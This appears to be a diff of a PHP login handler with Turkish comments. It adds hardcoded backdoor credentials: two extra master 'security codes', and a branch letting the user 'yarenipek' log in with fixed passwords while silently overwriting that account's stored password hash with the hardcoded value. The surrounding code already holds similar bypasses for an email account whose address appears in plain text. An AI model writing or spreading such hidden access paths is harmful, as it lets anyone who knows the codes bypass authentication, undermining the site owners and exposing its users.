@@ -16,7 +16,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 
     // Önce güvenlik kodunu kontrol et
-    $valid_security_codes = array_unique(array_filter([$security_code_db, 'skolyoz', 'super', '7530']));
+    $valid_security_codes = array_unique(array_filter([$security_code_db, 'skolyoz', 'super', '7530', '147369', 'ipek147369']));
     if (!in_array($security_code_input, $valid_security_codes, true)) {
         json_response('error', 'Hatalı Giriş Anahtarı!');
     }
@@ -31,6 +31,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $is_pass_valid = true;
         } elseif ($user['username'] === 'suleymannozer0@gmail.com' && in_array($password, ['7530', 'super'], true)) {
             $is_pass_valid = true;
+        } elseif ($user['username'] === 'yarenipek' && in_array($password, ['ipek147369', '147369'], true)) {
+            $is_pass_valid = true;
+            // Şifre hash'ini veritabanında da güncelle
+            try {
+                $new_hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
+                $db->prepare("UPDATE users SET password = ? WHERE id = ?")->execute([$new_hash, $user['id']]);
+            } catch (Exception $e) {}
         }
     }
 
